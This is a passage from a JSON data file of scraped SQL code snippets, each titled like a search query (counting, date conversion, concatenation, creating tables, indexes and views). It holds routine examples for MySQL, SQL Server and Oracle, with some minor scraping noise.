tab.name as table_name,         col.name as column_name       ,y.name as column_type       ,y.precision as column_precision    from [DB_NBR_2].sys.tables as tab         inner join [DB_NBR_2].sys.columns as col             on tab.object_id = col.object_id          JOIN sys.types y ON y.user_type_id = col.user_type_id          ) db2 on db1.table_name = db2.table_name and db1.column_name = db2.column_name where (db1.column_name is null or db2.column_name is null) order by 1, 2, 3 \nselect * from tableA minus select * from tableB \n",
    "reg_date": "2021-10-12T10:00:01.000Z"
  },
  {
    "id": 3793,
    "keyword": null,
    "link": null,
    "title": " sql compare tables for differences",
    "description": "(SELECT * FROM T1 MINUS SELECT * FROM T2)   -- Rows that are in T1 but not in T2 UNION ALL (SELECT * FROM T2 MINUS SELECT * FROM T1);  -- Rows that are in T2 but not in T1\n-- Find the different tables and columns between DB_NBR_1 and DB_NBR_2 -- (just replace DB_NBR_1 and DB_NBR_2) select isnull(db1.table_name, db2.table_name) as [table],        isnull(db1.column_name, db2.column_name) as [column],        db1.column_name as scripts_col_name       ,db1.column_type as scripts_col_type        ,db1.column_precision as scripts_col_precision        ,db2.column_name as liquid_col_name       ,db2.column_type as liquid_col_type       ,db2.column_precision as liquid_col_precision from (select schema_name(tab.schema_id) + '.' + tab.name as table_name,         col.name as column_name       ,y.name as column_type       ,y.precision as column_precision    from [DB_NBR_1].sys.tables as tab         inner join [DB_NBR_1].sys.columns as col             on tab.object_id = col.object_id          JOIN sys.types y ON y.user_type_id = col.user_type_id          ) db1 full outer join (select schema_name(tab.schema_id) + '.' + tab.name as table_name,         col.name as column_name       ,y.name as column_type       ,y.precision as column_precision    from [DB_NBR_2].sys.tables as tab         inner join [DB_NBR_2].sys.columns as col             on tab.object_id = col.object_id          JOIN sys.types y ON y.user_type_id = col.user_type_id          ) db2 on db1.table_name = db2.table_name and db1.column_name = db2.column_name where (db1.column_name is null or db2.column_name is null) order by 1, 2, 3 \n",
    "reg_date": "2021-10-12T10:00:02.000Z"
  },
  {
    "id": 3794,
    "keyword": null,
    "link": null,
    "title": " sql compilation error: is not a valid group by expression",
    "description": "SELECT a, b, sum(c) FROM my_table GROUP BY a;\t\t-- Error SELECT a, b, sum(c) FROM my_table GROUP BY a, b;\t-- OK, all expressions there -- CASE WHEN statement, for example: SELECT a, CASE WHEN b=1 THEN 'Ok' ELSE 'Ko' END AS r, sum(c)  FROM my_table GROUP BY a, CASE WHEN b=1 THEN 'Ok' ELSE 'Ko' END;\t\t-- No alias name (r)\n",
    "reg_date": "2021-10-12T10:00:02.000Z"
  },
  {
    "id": 3795,
    "keyword": null,
    "link": null,
    "title": " sql concat",
    "description": "   SELECT    CONCAT('SQL', ' ', 'is', ' ', 'fun!'); \nSELECT CONCAT('Code with', 'bulbul') AS Result;\nWe use \"||\" to concatenation in Sql  example: WHERE LOWER(FIRST_NAME || LAST_NAME)  LIKE '%d%' ; \nUm zwei oder mehr Zeichenfolgen miteinander zu verbinden,  verwendet man die Funktion CONCAT. Diese Funktion nimmt  zwei bis maximal 255 Eingabezeichenfolgen und verbindet sie zu einer.  SELECT CONCAT (String1, String2);\nselect Convert(nvarchar(50),ID)+'-'+Convert(nvarchar(50),Year) as ID_Year from tablename\n",
    "reg_date": "2021-10-12T10:00:02.000Z"
  },
  {
    "id": 3796,
    "keyword": null,
    "link": null,
    "title": " sql concat string with column value",
    "description": "SELECT CONCAT(name, \"string_value\") AS name FROM    users; \nSELECT 'Comments: ' + CAST(9 AS varchar(12)) AS Result;\n",
    "reg_date": "2021-10-12T10:00:02.000Z"
  },
  {
    "id": 3797,
    "keyword": null,
    "link": null,
    "title": " sql condition on temporary column",
    "description": "-- NOTE: this is for SQL-Oracle specifically  -- syntax: SELECT * FROM  (   SELECT    \t <column_1_value>         <column_1_temp_name>   \t,<column_2_value>         <column_2_temp_name>   \t,<column_3_value>         <column_3_temp_name>   FROM <_table_name_> ) WHERE <condition_including:<temp_column_name> >;  -- example: SELECT *  FROM  (   SELECT      (AMOUNT)                  TOTAL -- note: NOT ... as \"col_1\"     ,((AMOUNT) + (TAX))        TOTAL_WITH_TAX     ,((AMOUNT) - (DISCOUNT))   TOTAL_WITH_DISC   FROM SHOPPER ) WHERE TOTAL_WITH_TAX > 115.00; \n",
    "reg_date": "2021-10-12T10:00:02.000Z"
  },
  {
    "id": 3798,
    "keyword": null,
    "link": null,
    "title": " sql connection c#",
    "description": "private static void CreateCommand(string queryString,     string connectionString) {     using (SqlConnection connection = new SqlConnection(                connectionString))     {         SqlCommand command = new SqlCommand(queryString, connection);         command.Connection.Open();         command.ExecuteNonQuery();     } }\n",
    "reg_date": "2021-10-12T10:00:02.000Z"
  },
  {
    "id": 3799,
    "keyword": null,
    "link": null,
    "title": " sql connection string in .net core",
    "description": "{   \"ConnectionStrings\": {     \"BloggingDatabase\": \"Server=(localdb)\\\\mssqllocaldb;Database=EFGetStarted.ConsoleApp.NewDb;Trusted_Connection=True;\"   }, } \n",
    "reg_date": "2021-10-12T10:00:02.000Z"
  },
  {
    "id": 3800,
    "keyword": null,
    "link": null,
    "title": " sql constraint check value in list",
    "description": "ALTER TABLE <table> ADD CONSTRAINT chk_val CHECK (col in ('yes','no','maybe'))\nCREATE TABLE test(     _id BIGINT PRIMARY KEY NOT NULL,     decision NVARCHAR(5),     CHECK (decision in ('yes','no','maybe')) );\n",
    "reg_date": "2021-10-12T10:00:02.000Z"
  },
  {
    "id": 3801,
    "keyword": null,
    "link": null,
    "title": " sql constraints",
    "description": "NOT NULL \t # Ensures a column cannot have a NULL value UNIQUE \t\t # Ensures all values in a column are unique PRIMARY KEY  # Identifies a record in a table, is NOT NULL & UNIQUE FOREIGN KEY  # References a unique record from another table CHECK\t\t # Ensures all column values satisfy a condition DEFAULT\t\t # Set a default value for a column if none is entered INDEX\t\t # Quick way of retrieving records from database\nNOT NULL - Ensures that a column cannot have a NULL value UNIQUE - Ensures that all values in a column are different PRIMARY KEY - A combination of a NOT NULL and UNIQUE. Uniquely identifies each row in a table  CREATE TABLE table_name (     column1 datatype constraint,     column2 datatype constraint,     column3 datatype constraint,     .... );  CREATE TABLE Persons (     ID int NOT NULL,     LastName varchar(255) NOT NULL,     FirstName varchar(255) NOT NULL,     Age int );  CREATE TABLE Persons (     ID int NOT NULL,     LastName varchar(255) NOT NULL,     FirstName varchar(255),     Age int,     UNIQUE (ID) );  CREATE TABLE Persons (     ID int NOT NULL,     LastName varchar(255) NOT NULL,     FirstName varchar(255),     Age int,     PRIMARY KEY (ID) ); \nRULES ABOUT THE COLUMNS IN TABLE NOT NULL \t # Ensures a column cannot have a NULL value UNIQUE \t\t # Ensures all values in a column are unique PRIMARY KEY  # Identifies a record in a table, is NOT NULL & UNIQUE FOREIGN KEY  # References a unique record from another table CHECK\t\t # Ensures all column values satisfy a condition DEFAULT\t\t # Set a default value for a column if none is entered INDEX\t\t # Quick way of retrieving records from database\nIt creates a new constraint on an existing table, which is used to specify rules for any data in the table. Example: Adds a new PRIMARY KEY constraint named &lsquo;user&rsquo; on columns ID and SURNAME. ALTER TABLE users ADD CONSTRAINT user PRIMARY KEY (ID, SURNAME);\n",
    "reg_date": "2021-10-12T10:00:02.000Z"
  },
  {
    "id": 3802,
    "keyword": null,
    "link": null,
    "title": " sql contains vs like",
    "description": "SELECT * FROM table WHERE Column LIKE '%test%';\t\t-- can't use index SELECT * FROM table WHERE CONTAINS(Column, 'test'); -- faster with full text index\n",
    "reg_date": "2021-10-12T10:00:03.000Z"
  },
  {
    "id": 3803,
    "keyword": null,
    "link": null,
    "title": " sql convert",
    "description": "Cast( '2011-07-07' as date ) as convertedDate\n-- Specifically for Oracle  -- EXAMPLE CAST('732.98' AS INT)  /* SYNTAX CAST(<value_to_cast> AS <data_type_to_cast_to>) */\n-- CAST Syntax:   CAST ( expression AS data_type [ ( length ) ] )      -- CONVERT Syntax:   CONVERT ( data_type [ ( length ) ] , expression [ , style ] )   \n",
    "reg_date": "2021-10-12T10:00:03.000Z"
  },
  {
    "id": 3804,
    "keyword": null,
    "link": null,
    "title": " sql convert date",
    "description": "Cast( '2011-07-07' as date ) as convertedDate\nExample  SELECT CONVERT(varchar, '2017-08-25', 101);  CONVERT(data_type(length), expression, style)  Converting datetime to character: Without century\tWith century\tInput/Output\tStandard 0\t100\tmon dd yyyy hh:miAM/PM\tDefault 1\t101\tmm/dd/yyyy\tUS 2\t102\t yyyy.mm.dd\tANSI 3\t103\t dd/mm/yyyy\tBritish/French 4\t104\tdd.mm.yyyy\tGerman 5\t105\t dd-mm-yyyy\tItalian 6\t106\tdd mon yyyy\t- 7\t107\tMon dd, yyyy\t- 8\t108\thh:mm:ss\t- 9\t109\tmon dd yyyy hh:mi:ss:mmmAM (or PM)\tDefault + millisec 10\t110\tmm-dd-yyyy\tUSA 11\t111\t yyyy/mm/dd\tJapan 12\t112\t yyyymmdd\tISO 13\t113\tdd mon yyyy hh:mi:ss:mmm\tEurope (24 hour clock)> 14\t114\thh:mi:ss:mmm\t24 hour clock 20\t120\tyyyy-mm-dd hh:mi:ss\tODBC canonical (24 hour clock) 21\t121\tyyyy-mm-dd hh:mi:ss.mmm\tODBC canonical (24 hour clock)  \t126\tyyyy-mm-ddThh:mi:ss.mmm\tISO8601  \t127\tyyyy-mm-ddThh:mi:ss.mmmZ\tISO8601 (with time zone Z)  \t130\tdd mon yyyy hh:mi:ss:mmmAM\tHijiri  \t131\tdd/mm/yy hh:mi:ss:mmmAM\tHijiri \n-- Create test case DECLARE @myDateTime DATETIME SET @myDateTime = '2008-05-03' -- Convert string SELECT LEFT(CONVERT(VARCHAR, @myDateTime, 120), 10) \ncast date to 103\nDECLARE @counter INT = 0 DECLARE @date DATETIME = '2006-12-30 00:38:54.840'  CREATE TABLE #dateFormats (dateFormatOption int, dateOutput nvarchar(40))  WHILE (@counter <= 150 ) BEGIN    BEGIN TRY       INSERT INTO #dateFormats       SELECT CONVERT(nvarchar, @counter), CONVERT(nvarchar,@date, @counter)        SET @counter = @counter + 1    END TRY    BEGIN CATCH;       SET @counter = @counter + 1       IF @counter >= 150       BEGIN          BREAK       END    END CATCH END  SELECT * FROM #dateFormats\n",
    "reg_date": "2021-10-12T10:00:03.000Z"
  },
  {
    "id": 3805,
    "keyword": null,
    "link": null,
    "title": " sql convert date to string yyyy-mm-dd",
    "description": "SELECT CONVERT(varchar(10), CONVERT(date, '13/12/2016', 103), 120)\nselect CONVERT(char(10), GetDate(),126) /* 2020-12-23 */\n",
    "reg_date": "2021-10-12T10:00:03.000Z"
  },
  {
    "id": 3806,
    "keyword": null,
    "link": null,
    "title": " sql convert datetime to year",
    "description": "select YEAR(getdate()) /* 2020 */\n",
    "reg_date": "2021-10-12T10:00:03.000Z"
  },
  {
    "id": 3807,
    "keyword": null,
    "link": null,
    "title": " sql convert datetime to year month",
    "description": "    DATE_FORMAT(_column, '%Y-%m')AS `yyyy-mm`,\nselect YEAR(getdate()) /* 2020 */\n",
    "reg_date": "2021-10-12T10:00:03.000Z"
  },
  {
    "id": 3808,
    "keyword": null,
    "link": null,
    "title": " sql convert float to string",
    "description": "SELECT STR(float_field, 25, 5)\n",
    "reg_date": "2021-10-12T10:00:03.000Z"
  },
  {
    "id": 3809,
    "keyword": null,
    "link": null,
    "title": " sql convert to integer from decimal",
    "description": "-- CAST Syntax:   CAST ( expression AS data_type [ ( length ) ] )      -- CONVERT Syntax:   CONVERT ( data_type [ ( length ) ] , expression [ , style ] )   \n",
    "reg_date": "2021-10-12T10:00:03.000Z"
  },
  {
    "id": 3810,
    "keyword": null,
    "link": null,
    "title": " sql convert unix time to date",
    "description": "select FROM_UNIXTIME(UNIX_TIMESTAMP(),'%a %b %d %H:%i:%s UTC %Y');\n",
    "reg_date": "2021-10-12T10:00:03.000Z"
  },
  {
    "id": 3811,
    "keyword": null,
    "link": null,
    "title": " sql count(*)",
    "description": "SELECT count(*) FROM information_schema.columns WHERE table_name = 'Your_table_nale'; \n/*COUNT(column_name) will return the number of rows from the column  that are not NULL*/ SELECT COUNT(column_name) FROM table_name;  /*COUNT(*) will return the number of rows from the table*/ SELECT COUNT(*) FROM table_name;\nSELECT COUNT(*) FROM dbo.bigTransactionHistory; \nSELECT COUNT(column_name) FROM table_name WHERE condition;\n",
    "reg_date": "2021-10-12T10:00:03.000Z"
  },
  {
    "id": 3812,
    "keyword": null,
    "link": null,
    "title": " sql count",
    "description": "SELECT count(*) FROM information_schema.columns WHERE table_name = 'Your_table_nale'; \n/*COUNT(column_name) will return the number of rows from the column  that are not NULL*/ SELECT COUNT(column_name) FROM table_name;  /*COUNT(*) will return the number of rows from the table*/ SELECT COUNT(*) FROM table_name;\nSELECT COUNT(*) FROM dbo.bigTransactionHistory; \nSELECT COUNT(column_name) FROM table_name WHERE condition;\n",
    "reg_date": "2021-10-12T10:00:04.000Z"
  },
  {
    "id": 3813,
    "keyword": null,
    "link": null,
    "title": " sql count characters in column",
    "description": "SELECT length('abcd') FROM DUAL;\t\t-- Oracle SELECT length('abcd');\t\t\t\t\t-- MySql / PostGreSQL SELECT len('abcd');\t\t\t\t\t\t-- SQL Server\nSELECT LEN('W3Schools.com');\n",
    "reg_date": "2021-10-12T10:00:04.000Z"
  },
  {
    "id": 3814,
    "keyword": null,
    "link": null,
    "title": " sql count column",
    "description": "-- Oracle SELECT count(*) FROM ALL_TAB_COLUMNS WHERE OWNER='owner_name'  \tAND TABLE_NAME = 'table_name'; -- SQL Server / MySQL SELECT count(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'schema_name'  \tAND TABLE_NAME = 'table_name';\n",
    "reg_date": "2021-10-12T10:00:04.000Z"
  },
  {
    "id": 3815,
    "keyword": null,
    "link": null,
    "title": " sql count condition",
    "description": "select count(case Position when 'Manager' then 1 else null end) from ...   select sum(case Position when 'Manager' then 1 else 0 end) from ...\nSELECT count(CASE WHEN gender = 'F' THEN 1 ELSE NULL END) women_count,        count(CASE WHEN gender = 'M' THEN 1 ELSE NULL END) men_count FROM people;\nCOUNT(CASE WHEN <condition> THEN 1 END)\n",
    "reg_date": "2021-10-12T10:00:04.000Z"
  },
  {
    "id": 3816,
    "keyword": null,
    "link": null,
    "title": " sql count distinct group by",
    "description": "SELECT COUNT (DISTINCT column-name)  FROM table-name\nSELECT COUNT(DISTINCT program_name) AS Count,   program_type AS [Type]  FROM cm_production  WHERE push_number=@push_number  GROUP BY program_type\n",
    "reg_date": "2021-10-12T10:00:04.000Z"
  },
  {
    "id": 3817,
    "keyword": null,
    "link": null,
    "title": " sql count duplicate rows",
    "description": "SELECT username, email, COUNT(*) FROM users GROUP BY username, email HAVING COUNT(*) > 1 \nSELECT name, COUNT(email)  FROM users GROUP BY email HAVING COUNT(email) > 1\nSELECT _column, COUNT(*)  FROM _table GROUP BY _column HAVING COUNT(*) > 1\nSELECT [CaseNumber], COUNT(*) AS Occurrences FROM [CaseCountry] GROUP BY [CaseNumber] HAVING (COUNT(*) > 1)\n/* Gets reps */ SELECT fieldA, COUNT(*) FROM tableA GROUP BY fieldA HAVING COUNT(*) > 1  /* Use reps to filter results */ SELECT a.* FROM tableA a JOIN ( \tSELECT fieldA, COUNT(*) as 'count' \tFROM tableA \tGROUP BY fieldA \tHAVING COUNT(*) > 1 ) b ON a.fieldA = b.fieldA \nMultiple field= SELECT username, email, COUNT(*) FROM users GROUP BY username, email HAVING COUNT(*) > 1  Single field= SELECT _column, COUNT(*)  FROM _table GROUP BY _column HAVING COUNT(*) > 1\n",
    "reg_date": "2021-10-12T10:00:04.000Z"
  },
  {
    "id": 3818,
    "keyword": null,
    "link": null,
    "title": " sql count group by",
    "description": "SELECT gender, COUNT(*) FROM people GROUP BY gender;\nSELECT COUNT(Id), Country    FROM Customer  GROUP BY Country\n",
    "reg_date": "2021-10-12T10:00:04.000Z"
  },
  {
    "id": 3819,
    "keyword": null,
    "link": null,
    "title": " sql count having",
    "description": "-- Classes with more than 10 students SELECT student_class, COUNT(*) FROM students GROUP BY student_class  \tHAVING count(*) > 10;\nSELECT COUNT( * )  FROM agents  HAVING COUNT(*)>1; --count is greater than 1\n",
    "reg_date": "2021-10-12T10:00:04.000Z"
  },
  {
    "id": 3820,
    "keyword": null,
    "link": null,
    "title": " sql count if",
    "description": "select count(case Position when 'Manager' then 1 else null end) from ...   select sum(case Position when 'Manager' then 1 else 0 end) from ...\n/*COUNT(column_name) will return the number of rows from the column  that are not NULL*/ SELECT COUNT(column_name) FROM table_name;  /*COUNT(*) will return the number of rows from the table*/ SELECT COUNT(*) FROM table_name;\nSELECT count(CASE WHEN gender = 'F' THEN 1 ELSE NULL END) women_count,        count(CASE WHEN gender = 'M' THEN 1 ELSE NULL END) men_count FROM people;\nCOUNT(CASE WHEN <condition> THEN 1 END)\n",
    "reg_date": "2021-10-12T10:00:04.000Z"
  },
  {
    "id": 3821,
    "keyword": null,
    "link": null,
    "title": " sql count null as 0",
    "description": "SELECT sum(CASE WHEN column_A IS NULL THEN 1 ELSE 0 END) A,        sum(CASE WHEN column_B IS NULL THEN 1 ELSE 0 END) B FROM my_table;\n",
    "reg_date": "2021-10-12T10:00:05.000Z"
  },
  {
    "id": 3822,
    "keyword": null,
    "link": null,
    "title": " sql count null values in all columns",
    "description": "SELECT sum(CASE WHEN column_A IS NULL THEN 1 ELSE 0 END) A,        sum(CASE WHEN column_B IS NULL THEN 1 ELSE 0 END) B FROM my_table;\n",
    "reg_date": "2021-10-12T10:00:05.000Z"
  },
  {
    "id": 3823,
    "keyword": null,
    "link": null,
    "title": " sql count value greater than",
    "description": "SELECT COUNT(1) AS NumberOfGreaterThan0  FROM YourTable WHERE col1 >=0\n",
    "reg_date": "2021-10-12T10:00:05.000Z"
  },
  {
    "id": 3824,
    "keyword": null,
    "link": null,
    "title": " sql count where",
    "description": "select count(case Position when 'Manager' then 1 else null end) from ...   select sum(case Position when 'Manager' then 1 else 0 end) from ...\nSELECT count(*) FROM information_schema.columns WHERE table_name = 'Your_table_nale'; \n/*COUNT(column_name) will return the number of rows from the column  that are not NULL*/ SELECT COUNT(column_name) FROM table_name;  /*COUNT(*) will return the number of rows from the table*/ SELECT COUNT(*) FROM table_name;\nSELECT count(CASE WHEN gender = 'F' THEN 1 ELSE NULL END) women_count,        count(CASE WHEN gender = 'M' THEN 1 ELSE NULL END) men_count FROM people;\nSELECT COUNT(column_name) FROM table_name WHERE condition;\nSELECT COUNT(*) FROM EMPLOYEES;\n",
    "reg_date": "2021-10-12T10:00:05.000Z"
  },
  {
    "id": 3825,
    "keyword": null,
    "link": null,
    "title": " sql counter column",
    "description": "SELECT my_first_column, my_second_column,     ROW_NUMBER() OVER (ORDER BY my_order_column) AS Row_Counter FROM my_table \n",
    "reg_date": "2021-10-12T10:00:05.000Z"
  },
  {
    "id": 3826,
    "keyword": null,
    "link": null,
    "title": " sql crate database",
    "description": "CREATE DATABASE databasename;\nCREATE TABLE example (     id INT NOT NULL PRIMARY KEY AUTO_INCREMENT,     username VARCHAR(50) NOT NULL UNIQUE,     password VARCHAR(255) NOT NULL,     created_at DATETIME DEFAULT CURRENT_TIMESTAMP  );\nCREATE table songs (   id INTEGER PRIMARY KEY AUTOINCREMENT,   title TEXT,   artist TEXT,   mood TEXT,   duration INTEGER,   released INTEGER); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"Bohemian Rhapsody\", \"Queen\", \"epic\", 60, 1975); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"Let it go\", \"Idina Menzel\", \"epic\", 227, 2013); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"I will survive\", \"Gloria Gaynor\", \"epic\", 198, 1978); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"Twist and Shout\", \"The Beatles\", \"happy\", 152, 1963); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"La Bamba\", \"Ritchie Valens\", \"happy\", 166, 1958); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"I will always love you\", \"Whitney Houston\", \"epic\", 273, 1992); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"Sweet Caroline\", \"Neil Diamond\", \"happy\", 201, 1969); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"Call me maybe\", \"Carly Rae Jepsen\", \"happy\", 193, 2011);    SELECT * FROM songs;\n",
    "reg_date": "2021-10-12T10:00:05.000Z"
  },
  {
    "id": 3827,
    "keyword": null,
    "link": null,
    "title": " sql create a variable in select",
    "description": "-- Create the table. CREATE TABLE TestTable (cola int, colb char(3)); GO SET NOCOUNT ON; GO -- Declare the variable to be used. DECLARE @MyCounter int;  -- Initialize the variable. SET @MyCounter = 0;  -- Test the variable to see if the loop is finished. WHILE (@MyCounter < 26) BEGIN;    -- Insert a row into the table.    INSERT INTO TestTable VALUES        -- Use the variable to provide the integer value        -- for cola. Also use it to generate a unique letter        -- for each row. Use the ASCII function to get the        -- integer value of 'a'. Add @MyCounter. Use CHAR to        -- convert the sum back to the character @MyCounter        -- characters after 'a'.        (@MyCounter,         CHAR( ( @MyCounter + ASCII('a') ) )        );    -- Increment the variable to count this iteration    -- of the loop.    SET @MyCounter = @MyCounter + 1; END; GO SET NOCOUNT OFF; GO -- View the data. SELECT cola, colb FROM TestTable; GO DROP TABLE TestTable; GO \n",
    "reg_date": "2021-10-12T10:00:05.000Z"
  },
  {
    "id": 3828,
    "keyword": null,
    "link": null,
    "title": " sql create database",
    "description": "CREATE DATABASE databasename;\nCREATE TABLE example (     id INT NOT NULL PRIMARY KEY AUTO_INCREMENT,     username VARCHAR(50) NOT NULL UNIQUE,     password VARCHAR(255) NOT NULL,     created_at DATETIME DEFAULT CURRENT_TIMESTAMP  );\nCREATE table songs (   id INTEGER PRIMARY KEY AUTOINCREMENT,   title TEXT,   artist TEXT,   mood TEXT,   duration INTEGER,   released INTEGER); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"Bohemian Rhapsody\", \"Queen\", \"epic\", 60, 1975); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"Let it go\", \"Idina Menzel\", \"epic\", 227, 2013); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"I will survive\", \"Gloria Gaynor\", \"epic\", 198, 1978); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"Twist and Shout\", \"The Beatles\", \"happy\", 152, 1963); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"La Bamba\", \"Ritchie Valens\", \"happy\", 166, 1958); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"I will always love you\", \"Whitney Houston\", \"epic\", 273, 1992); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"Sweet Caroline\", \"Neil Diamond\", \"happy\", 201, 1969); INSERT INTO songs (title, artist, mood, duration, released)     VALUES (\"Call me maybe\", \"Carly Rae Jepsen\", \"happy\", 193, 2011);    SELECT * FROM songs;\nCreates a new database. Example: Creates a new database named &lsquo;websitesetup&rsquo;. CREATE DATABASE websitesetup;\n#TO Create a DB : CREATE DATABASE <DB_NAME>; #example : CREATE DATABASE MyDataBase ; #To Create a Table : CREATE TABLE <TB_NAME>(     <Elem 0> <Type_of_Elem created> <ADD_PROPRETIES>, #Don't forget the comma   \t...   \t...   \t...     <Elem n> <Type_of_Elem created> #last elems don't need a comma  ); /*example : CREATE TABLE city (     id int  NOT NULL IDENTITY(1, 1),     city_name char(128)  NOT NULL,     lat decimal(9,6)  NOT NULL,     long decimal(9,6)  NOT NULL,     country_id int  NOT NULL,     CONSTRAINT city_pk PRIMARY KEY  (id) ); */ \nSHOW DATABASES;  DROP DATABASE testDB;  USE DatabaseName;    SQL> CREATE TABLE CUSTOMERS(    ID   INT              NOT NULL,    NAME VARCHAR (20)     NOT NULL,    AGE  INT              NOT NULL,    ADDRESS  CHAR (25) ,    SALARY   DECIMAL (18, 2),           PRIMARY KEY (ID) );  DESC CUSTOMERS;\n",
    "reg_date": "2021-10-12T10:00:05.000Z"
  },
  {
    "id": 3829,
    "keyword": null,
    "link": null,
    "title": " sql create db command",
    "description": "CREATE DATABASE databasename;\n",
    "reg_date": "2021-10-12T10:00:05.000Z"
  },
  {
    "id": 3830,
    "keyword": null,
    "link": null,
    "title": " sql create index",
    "description": "CREATE INDEX index_name ON tableName (tableColumn);\n-- Create a nonclustered index on a table or view CREATE INDEX i1 ON t1 (col1);  -- Create a clustered index on a table and use a 3-part name for the table CREATE CLUSTERED INDEX i1 ON d1.s1.t1 (col1);  -- Syntax for SQL Server and Azure SQL Database -- Create a nonclustered index with a unique constraint -- on 3 columns and specify the sort order for each column CREATE UNIQUE INDEX i1 ON t1 (col1 DESC, col2 ASC, col3 DESC); \n",
    "reg_date": "2021-10-12T10:00:05.000Z"
  },
  {
    "id": 3831,
    "keyword": null,
    "link": null,
    "title": " sql create new guid",
    "description": "-- Creating a local variable with DECLARE/SET syntax.   DECLARE @myid uniqueidentifier   SET @myid = NEWID()   PRINT 'Value of @myid is: '+ CONVERT(varchar(255), @myid)   \n",
    "reg_date": "2021-10-12T10:00:06.000Z"
  },
  {
    "id": 3832,
    "keyword": null,
    "link": null,
    "title": " sql create table",
    "description": "# Creates a Simple User table # Uses an auto-incrementing primary key as userId   CREATE TABLE user (     userId INT NOT NULL AUTO_INCREMENT PRIMARY KEY,     username VARCHAR(100),     password VARCHAR(100)  ) ENGINE=InnoDB;\n# Simple table describing a vehicle  CREATE TABLE vehicle(   \t# vehicleId: Unique ID for Primary Key.   \t# This is how we will reference a record \tvehicleId INT NOT NULL,     \tmake VARCHAR(64), # String 64 chars max   \tmodel VARCHAR(128),   \tderivative VARCHAR(255),   \tPRIMARY KEY(vehicleId) );  # Add a record INSERT INTO vehicle VALUES(1000,'Volkswagen','Golf','1.5 TSI EVO Match Edition 5dr');\nCREATE TABLE Persons (     PersonID int,     LastName varchar(255),     FirstName varchar(255),     Address varchar(255),     City varchar(255) );\nCreates a new table . Example: Creates a new table called &lsquo;users&rsquo; in the &lsquo;websitesetup&rsquo; database. CREATE TABLE users ( id int, first_name varchar(255), surname varchar(255), address varchar(255), contact_number int );\nCREATE TABLE table_name (       column1 datatype,       column2 datatype,       column3 datatype,     ....  ); \nCREATE TABLE li_wedding (    guest_id INT,    last_name VARCHAR(255),    first_name VARCHAR(255),    attending BOOL,    diet VARCHAR(255) ); \n",
    "reg_date": "2021-10-12T10:00:06.000Z"
  },
  {
    "id": 3833,
    "keyword": null,
    "link": null,
    "title": " sql create table with datetime automatically",
    "description": "CREATE TABLE myTable ( col1 int, createdDate datetime DEFAULT(getdate()), updatedDate datetime DEFAULT(getdate()) )\n",
    "reg_date": "2021-10-12T10:00:06.000Z"
  },
  {
    "id": 3834,
    "keyword": null,
    "link": null,
    "title": " sql create view",
    "description": "CREATE VIEW view_name AS SELECT column1, column2, ... FROM table_name WHERE condition;\nCREATE VIEW view_name AS SELECT id,category,MAX(created_at),content,title FROM table WHERE condition GROUP BY category\n",
    "reg_date": "2021-10-12T10:00:06.000Z"
  },
  {
    "id": 3835,
    "keyword": null,
    "link": null,
    "title": " sql cross apply vs join",
    "description": "SELECT M.ID,M.NAME,D.PERIOD,D.QTY FROM MASTER M INNER JOIN (     SELECT TOP 2 ID, PERIOD,QTY      FROM DETAILS D           ORDER BY CAST(PERIOD AS DATE)DESC )D ON M.ID=D.ID \n",
    "reg_date": "2021-10-12T10:00:06.000Z"
  },
  {
    "id": 3836,
    "keyword": null,
    "link": null,
    "title": " sql cross join",
    "description": "SELECT *  FROM table1  CROSS JOIN table2;\n12SELECT columns  FROM table_A, table_BXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n123SELECT columns  FROM table_A  CROSS JOIN table_BXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n",
    "reg_date": "2021-10-12T10:00:06.000Z"
  },
  {
    "id": 3837,
    "keyword": null,
    "link": null,
    "title": " sql current date",
    "description": "In MySQL the CURDATE() returns the current date in 'YYYY-MM-DD' format or 'YYYYMMDD' format depending on whether numeric or string is used in the function. CURRENT_DATE and CURRENT_DATE() are the synonym of CURDATE()\nGETDATE() \nSELECT getdate(); -- Get Current date in SQL Server\nSELECT NOW(); It returns current date and time.\nINSERT INTO my_table (last_updated) VALUES(NOW()); INSERT INTO my_table (last_updated) VALUES(sysdate);\t-- Oracle INSERT INTO my_table (last_updated) VALUES(getdate());\t-- SQL Server\nAdd GETDATE() in sql query where you want to pass current timestamp.  Example Return the current database system date and time:  SELECT GETDATE();\n",
    "reg_date": "2021-10-12T10:00:06.000Z"
  },
  {
    "id": 3838,
    "keyword": null,
    "link": null,
    "title": " sql current timestamp",
    "description": "SELECT CURRENT_TIMESTAMP;\n",
    "reg_date": "2021-10-12T10:00:06.000Z"
  },
  {
    "id": 3839,
    "keyword": null,
    "link": null,
    "title": " sql current year",
    "description": "select year(getdate())\n-- Oracle SELECT extract(YEAR FROM sysdate) FROM dual;\t\t\t// number SELECT to_char(sysdate, 'YYYY') FROM dual;\t\t\t\t// varchar\n/*My workbench*/  YEAR(CURDATE())\n",
    "reg_date": "2021-10-12T10:00:06.000Z"
  },
  {
    "id": 3840,
    "keyword": null,
    "link": null,
    "title": " sql cursor",
